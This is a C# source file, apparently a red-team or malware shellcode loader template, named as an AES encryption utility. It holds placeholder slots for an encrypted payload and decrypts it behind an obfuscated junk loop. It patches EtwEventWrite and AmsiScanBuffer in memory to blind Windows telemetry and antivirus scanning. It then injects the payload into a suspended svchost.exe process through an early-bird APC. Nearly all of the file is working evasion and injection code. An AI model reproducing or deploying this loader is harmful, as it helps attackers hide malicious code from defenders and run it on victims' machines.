using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using System.Runtime.InteropServices;
using static System.Object;
namespace EncryptionDecryptionUsingSymmetricKey
{
public class AesOperation
    {   [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, int dwThreadId);
        [DllImport("kernel32.dll")]
        private static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);
        [DllImport("mscoree.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern void Reverse(Array array);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FreeConsole();




        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

       
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        

       static void Main(string[] args)
        {   
            
            byte[] Slucajno1 = new byte[] KEYVAL
            byte[] Slucajno2 = new byte[] PAYVAL
            byte[] Slucajno3 = new byte[] IVVAL
            byte[] Slucajno4 = Slucajno8(Slucajno1, Slucajno3, Slucajno2);
            byte[] Slucajno5 = new byte[] ENKEY
            byte[] Slucajno6 = new byte[]  IVKEY
            byte[] Slucajno7 = Slucajno8(Slucajno4,Slucajno5,Slucajno6);
            Slucajno33(Slucajno7);
            FreeConsole();
            Slucajno33(Slucajno7);
            Slucajno29(Slucajno7);
       
        }


public static void Slucajno33(byte[] array)
{
    if (array == null || array.Length <= 1)
    {
        return;
    }

    int Slucajno37 = 0; 
    int Slucajno38 = array.Length - 1; 

    while (Slucajno37 < Slucajno38)  
    {
        byte temp = array[Slucajno37];
        array[Slucajno37] = array[Slucajno38];
        array[Slucajno38] = temp;
        Slucajno37++;
        Slucajno38--;
    }
}

public static byte[] Slucajno8(byte[] Slucajno11, byte[] Slucajno31, byte[] Slucajno12)

{
try
  {

   for (int Slucajno33 = 0; Slucajno33 < 255; Slucajno33++)
    {
        for (int Slucajno34 = 0; Slucajno34 < 145; Slucajno34++)
        {
            for (int Slucajno35 = 0; Slucajno35 < 452; Slucajno35++)
            {
                for (int Slucajno36= 0; Slucajno34 < 1389; Slucajno35++)
                {
                    while (true)
                    {
                        if (Slucajno33 == Slucajno34 && Slucajno35 == Slucajno36)
                        {
                            throw new Exception("Slucajno32");
                        }
                        else
                        {
                            if (Slucajno33 > Slucajno34 && Slucajno35 > Slucajno36)
                            {
                                Slucajno33 = Slucajno34 - 1;
                                Slucajno35 = Slucajno34 - 1;
                                Slucajno36 = Slucajno34 = 0;
                                continue;
                            }
                            else if (Slucajno33 > Slucajno36)
                            {
                                Slucajno33 = Slucajno34 - 1;
                                Slucajno34 = Slucajno36 = 0;
                                continue;
                            }
                            else if (Slucajno36 > Slucajno35)
                            {
                                Slucajno34 = Slucajno36 = 0;
                                continue;
                            }
                            else
                            {
                                break;
                                return null;
                            }
                        }

                    }
                }
            }
        }
    }
    return null;        
}
        catch (Exception ex)
        {
             using (Aes Slucajno9 = Aes.Create())
            {
                byte[] Slucajno10 = SHA256.Create().ComputeHash(Slucajno11);
                Slucajno9.Key = Slucajno10;
                Slucajno9.IV = Slucajno12;
                ICryptoTransform Slucajno13 = Slucajno9.CreateDecryptor(Slucajno9.Key, Slucajno9.IV);
                byte[] Slucajno14;
                using (MemoryStream Slucajno15 = new MemoryStream(Slucajno31))
                {
                    using (CryptoStream Slucajno16 = new CryptoStream(Slucajno15, Slucajno13, CryptoStreamMode.Read))
                    {
                        using (MemoryStream Slucajno17 = new MemoryStream())
                        {
                            Slucajno16.CopyTo(Slucajno17);
                            Slucajno14 = Slucajno17.ToArray();
                        }
                    }
                }

                Slucajno9.Clear();
                Slucajno13.Dispose();

                return Slucajno14;
            }
        }
    }

 
    
    

static void Slucajno29(byte[] Slucajno30)

    {

            IntPtr Slucajno18 = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
            uint Slucajno19;
            VirtualProtect(Slucajno18, (UIntPtr)4096, 0x40, out Slucajno19);
            byte[] patch = { 0x48, 0x33, 0xc0, 0xc3 };
            Marshal.Copy(patch, 0, Slucajno18, patch.Length);
            VirtualProtect(Slucajno18, (UIntPtr)4096, Slucajno19, out Slucajno19);
            uint Slucajno20;
            byte[] Slucajno21 = {0x83,0xE0,0x00,0x05,0x31,0x00,0x94,0x90,0x2D,0xDA,0xFF,0x8C,0x10,0xC3};   
            IntPtr Slucajno22 = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
            VirtualProtect(Slucajno22, (UIntPtr)Slucajno21.Length, 0x40, out Slucajno20);   
            Marshal.Copy(Slucajno21, 0, Slucajno22, Slucajno21.Length);
            VirtualProtect(Slucajno22, (UIntPtr)Slucajno21.Length, Slucajno20, out Slucajno20);
            IntPtr Slucajno23;
            STARTUPINFO Slucajno24 = new STARTUPINFO();
            PROCESS_INFORMATION Slucajno25 = new PROCESS_INFORMATION();
            IntPtr Slucajno26 = GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualAlloc");
            CreateProcess(@"C:\Windows\system32\svchost.exe", Slucajno26, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref Slucajno24, out Slucajno25);    
            IntPtr Slucajno27 = VirtualAllocEx(Slucajno25.hProcess, IntPtr.Zero, (uint)Slucajno30.Length, 0x1000, 0x04);
            WriteProcessMemory(Slucajno25.hProcess, Slucajno27, Slucajno30, Slucajno30.Length, out Slucajno23);
            VirtualProtectEx(Slucajno25.hProcess, Slucajno27, Slucajno30.Length, 0x20, out Slucajno20);  
            IntPtr Slucajno28 = OpenThread(0x0010, false, (int)Slucajno25.dwThreadId); 
            QueueUserAPC(Slucajno27, Slucajno28, IntPtr.Zero);
            ResumeThread(Slucajno25.hThread);
}
}
}
